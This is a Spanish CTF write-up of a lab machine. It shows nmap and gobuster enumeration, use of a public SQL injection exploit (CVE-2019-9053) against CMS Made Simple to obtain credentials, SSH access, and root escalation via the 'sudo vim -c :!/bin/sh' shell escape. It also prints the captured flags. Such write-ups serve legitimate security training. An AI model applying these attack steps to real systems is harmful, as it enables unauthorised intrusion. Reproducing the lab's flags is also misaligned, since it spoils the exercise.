# 🛡️ Write-up – CTF: CMS Made Simple + SSH + Privilege Escalation
## 🧩 Descripción de la máquina
La máquina vulnerable expone una instalación de CMS Made Simple 2.2.8 accesible a través de un servidor web Apache. A través de la enumeración, se descubre un exploit de inyección SQL no autenticada (CVE-2019-9053) que permite obtener credenciales válidas. El acceso SSH está configurado en un puerto no estándar (2222), y una vez dentro del sistema como usuario, es posible escalar privilegios a root mediante un binario sudo mal configurado (vim con NOPASSWD). El objetivo es capturar las flags de usuario y root.

## 🧭 1. Escaneo inicial con Nmap
Comencé el CTF escaneando todos los puertos del objetivo para ver qué servicios estaban disponibles. Utilicé un escaneo agresivo de Nmap con scripts y detección de versiones:
```bash
nmap --privileged -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn -oN escaneo.txt 10.10.152.40
```

Los puertos más interesantes que descubrí fueron:
- 21 – FTP (vsftpd 3.0.3)
- 80 – HTTP (Apache 2.4.18)
- 2222 – SSH (OpenSSH 7.2p2)
  
Probé acceso anónimo al FTP, que estaba habilitado, pero no pude listar el contenido.

## 🔍 2. Enumeración web
Al acceder al puerto 80, vi la página por defecto de Apache. Así que ejecuté gobuster para buscar rutas ocultas:
```bash
gobuster dir -u http://10.10.152.40 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Encontré la ruta /simple, que resultó ser una instalación de CMS Made Simple.

## 📦 3. Identificación del CMS y versión
Al revisar el pie de página de la web, vi que la versión del CMS era:
```text
CMS Made Simple 2.2.8
```

Esto me dio una buena pista para buscar vulnerabilidades conocidas.

## 💥 4. Explotación con SQL Injection (CVE-2019-9053)
Buscando en Exploit-DB, encontré el exploit 46635, que permite explotar una inyección SQL no autenticada en versiones anteriores a la 2.2.10.

Ejecuté el exploit con Python:
```bash
python exploit.py -u http://10.10.152.40/simple
```

Y recuperé credenciales válidas:
```text
Usuario: mitch
Contraseña: secret
```

## 🔐 5. Acceso por SSH
Probé conectarme al puerto 2222 usando esas credenciales:
```bash
ssh -p 2222 mitch@10.10.152.40
```

¡Funcionó! Ya tenía acceso como el usuario mitch.

## 🏁 6. Obtención de la flag de usuario
Una vez dentro, revisé el home del usuario y encontré la flag:
```bash
cat user.txt
```
```text
Flag de usuario:
RzAwZCBqMGIsIGtlZXAgdXAh
```

## 📈 7. Escalada de privilegios
Ejecuté sudo -l para ver si podía ejecutar algo como root. Tuve suerte:
```bash
(root) NOPASSWD: /usr/bin/vim
```
Esto me permitió usar vim como root sin contraseña. Aproveché esta configuración con:
```bash
sudo vim -c ':!/bin/sh'
```

Con eso obtuve una shell con privilegios root (#).

## 👑 8. Acceso a la flag de root
Ya como root, navegué al directorio /root y encontré la flag final:
```bash
cd /root
cat root.txt
```
```text
Flag de root:
VzNsbCBkMG4zLiBZb3UgbWFkZSBpdCE=
```

## ✅ Conclusión
Esta máquina fue muy entretenida. Me permitió practicar:
- Enumeración de servicios y puertos
- Descubrimiento y análisis de versiones de CMS
- Uso de exploits públicos (SQLi sin autenticación)
- Conexión SSH en puerto no estándar
- Escalada de privilegios mediante binario vulnerable (vim con sudo)
  
Una ruta completa desde la web hasta el root. ¡Muy buen reto para practicar técnicas reales de pentesting web + post-explotación!
